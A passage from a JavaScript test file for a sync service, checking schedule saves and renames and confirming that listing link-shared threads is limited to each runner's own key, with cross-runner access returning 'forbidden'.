  await call(s.ctx, sync.saveSchedule, { key: BRUCE_KEY, schedule: sched(UUID(32), BRUCE) });
  await call(s.ctx, sync.saveSchedule, { key: OWNER, schedule: sched(UUID(33), M5) });
  await call(s.ctx, sync.saveSchedule, { key: OWNER, schedule: sched(UUID(33), BRUCE) });
  await call(s.ctx, sync.saveSchedule, { key: BRUCE_KEY, schedule: sched(UUID(33), BRUCE, { title: 'renamed' }) });
  assert.equal(s.rows('schedules').find((r) => r.id === UUID(33))?.title, 'renamed');
});

test("sync:sharedThreads lists a runner's link-shared rows only, and a runner key only its own", async () => {
  const s = await setup();
  await s.owner.upsert(thread('ON', M5, { share: { access: 'link', slug: 'on-slug' } }), thread('OFF', M5, { share: { access: 'off', slug: 'off-slug' } }), thread('NEVER', M5));
  await s.bruce.upsert(thread('BRUCE-ON', BRUCE, { share: { access: 'link', slug: 'b-slug' } }));
  assert.deepEqual(await call(s.ctx, sync.sharedThreads, { key: OWNER, runnerId: M5 }), ['ON']);
  assert.deepEqual(await call(s.ctx, sync.sharedThreads, { key: BRUCE_KEY, runnerId: BRUCE }), ['BRUCE-ON']);
  assert.equal(await outcome(call(s.ctx, sync.sharedThreads, { key: BRUCE_KEY, runnerId: M5 })), 'forbidden');
});
